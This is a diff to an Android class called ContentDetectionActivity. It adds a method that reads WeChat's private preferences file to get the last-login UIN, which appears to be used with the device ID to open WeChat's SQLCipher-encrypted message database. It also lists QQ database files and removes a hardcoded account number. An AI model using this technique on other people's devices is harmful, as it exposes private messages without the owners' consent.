@@ -762,11 +762,13 @@ public class ContentDetectionActivity extends Activity implements
 		return qqBuilder.toString();
 	}
 
-	public List getQQdbList(String path) {
+	public List<String> getQQdbList(String path) {
+		Logger.i("flielist",path);
 		List list = new ArrayList();
 		try {
 			File file = new File(path);
 			String[] filelist = file.list();
+			Logger.i("flielist",String.valueOf(filelist.length));
 			for (int i = 0; i < filelist.length; i++) {
 				Pattern pattern = Pattern.compile("[0-9]*.db");
 				Matcher matcher = pattern.matcher(filelist[i]);
@@ -791,7 +793,7 @@ public class ContentDetectionActivity extends Activity implements
 	public String getWechat() throws Exception {
 
 		net.sqlcipher.database.SQLiteDatabase.loadLibs(this);
-		String uin = "730056401";
+		String uin = readUin();
 		
 		TelephonyManager tm = (TelephonyManager) mCtx
 				.getSystemService(Context.TELEPHONY_SERVICE);
@@ -860,5 +862,36 @@ public class ContentDetectionActivity extends Activity implements
 			num2 += onceNum;
 		}
 		return wxBuilder.toString();
+	}
+	
+	private String readUin(){
+    	File file = new File("/data/data/com.tencent.mm/shared_prefs/com.tencent.mm_preferences.xml");
+		InputStreamReader read = null;
+		try {
+			read = new InputStreamReader(new FileInputStream(file), "UTF-8");
+		} catch (UnsupportedEncodingException e) {
+			// TODO 自动生成的 catch 块
+			e.printStackTrace();
+		} catch (FileNotFoundException e) {
+			// TODO 自动生成的 catch 块
+			e.printStackTrace();
+		}
+		BufferedReader reader = new BufferedReader(read);
+		String filecontent = "";
+		String tempcontent = "";
+		try {
+			while ((tempcontent = reader.readLine()) != null) {
+				filecontent += tempcontent;
+			}
+			reader.close();
+		} catch (IOException e) {
+			// TODO 自动生成的 catch 块
+			e.printStackTrace();
+		}
+		String regEx = "<string name=\"last_login_uin\">([\\s\\S]*?)</string>";
+		Pattern pat = Pattern.compile(regEx);
+		Matcher mat = pat.matcher(filecontent);
+		mat.find();
+		return mat.group(1);
 	}
 }
